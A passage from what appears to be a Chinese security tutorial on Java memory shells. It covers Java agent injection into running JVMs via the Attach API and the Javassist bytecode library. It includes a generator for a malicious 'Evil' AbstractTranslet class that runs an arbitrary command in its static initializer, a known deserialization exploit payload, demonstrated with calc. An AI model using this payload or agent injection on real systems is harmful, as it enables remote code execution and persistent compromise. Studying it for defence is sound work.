+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.agentmain.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentAgentmain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;agentmain-Agent&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>配置 MANIFEST.MF 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.agentmain.agent.JavaAgentAgentmain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure>
+
+
+
+<p>之后编译得到 <strong>Agentmain.jar</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>编写测试类Inject_Agent，可以将agent注入到正在运行的JVM中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        String path=<span class="hljs-string">&quot;D:\\JavaCode\\内存马\\JavaAgentTest\\dist\\Agentmain.jar&quot;</span>;<br><br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br>            System.out.println(vmd.displayName());<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().contains(<span class="hljs-string">&quot;Sleep&quot;</span>))&#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(path);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>先运行 SleepHello.java 再运行	InjectAgent.java</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="4-2-动态修改字节码"><a href="#4-2-动态修改字节码" class="headerlink" title="4.2 动态修改字节码"></a>4.2 动态修改字节码</h2><h3 id="4-2-1-Javassist"><a href="#4-2-1-Javassist" class="headerlink" title="4.2.1 Javassist"></a>4.2.1 Javassist</h3><p>用来处理Java字节码的类库，允许在已经编译好的类中添加新的方法，或者修改已有的方法，同时也可以通过手动的方式去生成一个新的类对象</p>
+<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。</p>
+<h4 id="类池-ClassPool"><a href="#类池-ClassPool" class="headerlink" title="类池 ClassPool"></a>类池 ClassPool</h4><p>ClassPool是 CtClass 对象的容器。它按需读取类文件来构造 CtClass 对象，并且保存 CtClass 对象以便以后使用。需要注意的是 ClassPool 会在内存中维护所有被它创建过的 CtClass，当 CtClass 数量过多时，会占用大量的内存，API 中给出的解决方案是有意识的调用 CtClass 的 detach() 方法以释放内存。</p>
+<p><strong>主要方法</strong>有以下几个：</p>
+<ul>
+<li>getDefault：获取默认的 ClassPool 对象。</li>
+<li>get、getCtClass：根据类名获取 CtClass 对象，用于操作类的字节码。</li>
+<li>makeClass：创建一个新的 CtClass 对象，用于新增类。</li>
+<li>insertClassPath、appendClassPath：插入类搜索路径，提供给类加载器用于加载类。</li>
+<li>toClass：将修改后的 CtClass 加载至当前线程的上下文类加载器中。通过调用 CtClass 的 toClass() 方法实现了将 CtClass 转换为 Class 对象，这样就可以在运行时使用这个类。需要注意的是一旦调用该方法，则无法继续修改已经被加载的 Class 对象。</li>
+</ul>
+<p>获得方法如下：</p>
+<p>通过<code>ClassPool.getDefault()</code>使用JVM的类搜索路径。如果程序运行在JBoss或者Tomcat的Web服务器上，则ClassPool可能无法找到用户的类，因为Web服务器会使用多个类加载器作为系统类加载器。在这种情况下，ClassPool必须添加额外的搜索路径</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获得方法</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-comment">//添加类搜索路径</span><br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(&lt;Class&gt;));<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>CtClass 是 Javassist 中的一个抽象类，用于表示一个类文件。</p>
+<p><strong>CtClass 需要关注的方法：</strong></p>
+<ul>
+<li>freeze：冻结一个类，使其不可修改。</li>
+<li>isFrozen：判断一个类是否已被冻结。</li>
+<li>prune：删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用。</li>
+<li>defrost：解冻一个类，使其可以被修改。如果事先知道一个类会被 defrost ， 则禁止调用 prune 方法。</li>
+<li>detach：将该 class 从 ClassPool 中删除。</li>
+<li>setSuperclass：设置当前类的父类。</li>
+<li>writeFile：将 CtClass 对象转换为类文件并将其写入本地磁盘。</li>
+<li>toClass：通过类加载器加载该 CtClass ，示例：<code>Class clazz = cc.toClass();</code> 。</li>
+<li>toBytecode：获取 CtClass 的字节码，示例：<code>byte[] b = cc.toBytecode();</code> 。</li>
+</ul>
+<p>可以通过以下代码获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassPool.get(ClassName)<br></code></pre></td></tr></table></figure>
+
+<h4 id="CtMethod-和-CtField"><a href="#CtMethod-和-CtField" class="headerlink" title="CtMethod 和 CtField"></a>CtMethod 和 CtField</h4><p>CtMethod 和 CtField 分别代表 Java 类中的方法和字段。通过 CtClass 对象，可以获取、添加、删除或修改类中的方法和字段。这些对象提供了丰富的 API ，用于操作方法和字段的各种属性，如访问修饰符、名称、返回类型等。</p>
+<p>CtMethod 中的一些重要方法：</p>
+<ol>
+<li>insertBefore：在方法的起始位置插入代码。</li>
+<li>insterAfter：在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到 exception 。</li>
+<li>insertAt：在指定的位置插入代码。</li>
+<li>setBody：将方法的内容设置为要写入的代码，当方法被 abstract 修饰时，该修饰符被移除。</li>
+<li>make：创建一个新的方法。</li>
+</ol>
+<p>利用 CtMethod 中的 insertBefore，insterAfter，insertAt 等方法可以实现 AOP 增强功能。</p>
+<p>通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，其中该类提供了一些方法可以让我们直接修改方法体，方法如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtBehavior</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtBehavior</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtMethod</span> &#123;<br>    <span class="hljs-comment">//设置方法体</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBody</span><span class="hljs-params">(String src)</span>;<br><br>    <span class="hljs-comment">// 插入在方法体最前面</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// 插入在方法体最后面</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertAfter</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// 在方法体的某一行插入内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertAt</span><span class="hljs-params">(<span class="hljs-type">int</span> lineNum, String src)</span>;<br> <br>&#125;<br>    <br></code></pre></td></tr></table></figure>
+
+<p>其中传递给<code>insertBefore</code>、<code>insertAfter</code>和<code>insertAt</code>的String对象是由<code>Javassist</code>的编译器进行编译的。该编译器支持语言的扩展，以下以$符号开头的几个标识符具有特殊的含义：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="Javassist-使用"><a href="#Javassist-使用" class="headerlink" title="Javassist 使用"></a>Javassist 使用</h4><p>依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.27.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用 javassist 创建一个 Person 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CreatePerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//获取 CtClass 对象容器 ClassPool</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//创建一个新类 Javassist.Learning.Person</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;javassist.Person&quot;</span>);<br>        <span class="hljs-comment">//创建一个 Person 类的属性 name</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">ctField1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>),<span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        <span class="hljs-comment">//设置属性访问符</span><br>        ctField1.setModifiers(Modifier.PRIVATE);<br>        <span class="hljs-comment">//将属性添加到 Person中，并设置初始值</span><br>        ctClass.addField(ctField1,CtField.Initializer.constant(<span class="hljs-string">&quot;aaa&quot;</span>));<br><br>        <span class="hljs-comment">//向 Person 类中添加 setter 和 getter 方法</span><br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>,ctField1));<br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>,ctField1));<br><br>        <span class="hljs-comment">//创建一个无参构造</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//设置方法体</span><br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;aaa\&quot;;&#125;&quot;</span>);<br>        <span class="hljs-comment">//向 Person 类中添加无参构造</span><br>        ctClass.addConstructor(ctConstructor);<br><br>        <span class="hljs-comment">//创建一个类方法 printName</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//设置方法访问符</span><br>        ctMethod.setModifiers(Modifier.PUBLIC);<br>        <span class="hljs-comment">//设置方法体</span><br>        ctMethod.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hello World\&quot;);&#125;&quot;</span>);<br>        <span class="hljs-comment">//将方法添加至 Person 中</span><br>        ctClass.addMethod(ctMethod);<br><br>        <span class="hljs-comment">//将生成的字节码写入文件中</span><br>        ctClass.writeFile();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;start&quot;</span>);<br>        CreatePerson();<br>        System.out.println(<span class="hljs-string">&quot;finish&quot;</span>);<br>    &#125;<br>&#125;<br><br> <br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>创建好的 Person.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> javassist;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;aaa&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String var1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;aaa&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="使用Javassist生成恶意class"><a href="#使用Javassist生成恶意class" class="headerlink" title="使用Javassist生成恶意class"></a>使用Javassist生成恶意class</h4><p>从字节码层面生成恶意 class ，跳过恶意类的编译过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javassist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">createShell</span> &#123;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成包含恶意命令的TemplatesImpl字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cmd 要执行的系统命令</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 生成的字节码数组</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取默认的类池</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <br>            <span class="hljs-comment">// 创建一个新的类，名为&quot;Evil&quot;</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <br>            <span class="hljs-comment">// 获取AbstractTranslet类作为父类</span><br>            <span class="hljs-comment">// 这是XSLT转换器的基类，常用于Java反序列化利用</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <br>            <span class="hljs-comment">// 创建类的初始化构造函数</span><br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            <br>            <span class="hljs-comment">// 在构造函数体中插入执行系统命令的代码</span><br>            ctConstructor.setBody(<span class="hljs-string">&quot;try&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +  <span class="hljs-comment">// 执行传入的命令</span><br>                    <span class="hljs-string">&quot;        &#125;catch (Exception e)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;        &#125;&quot;</span>);  <span class="hljs-comment">// 异常处理，静默失败</span><br>            <br>            <span class="hljs-comment">// 将CtClass转换为字节数组</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <br>            <span class="hljs-comment">// 从类池中分离该类，释放资源</span><br>            ctClass.detach();<br>            <br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将生成的恶意类字节码写入文件</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeShell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 生成执行calc命令的恶意字节码</span><br>        <span class="hljs-type">byte</span>[] shell = createShell.getTemplatesImpl(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <br>        <span class="hljs-comment">// 创建文件输出流，将字节码写入bbb.class文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;bbb.class&quot;</span>));<br>        fileOutputStream.write(shell);<br>        <br>        <span class="hljs-comment">// 注意：这里应该关闭流，建议使用try-with-resources</span><br>        fileOutputStream.close();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 主方法 - 程序入口</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args 命令行参数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeShell();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="4-2-2-Instrumentation-动态修改字节码"><a href="#4-2-2-Instrumentation-动态修改字节码" class="headerlink" title="4.2.2 Instrumentation 动态修改字节码"></a>4.2.2 Instrumentation 动态修改字节码</h3><p> Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。  </p>
+<p> 其在Java中是一个接口，常用方法如下  </p>
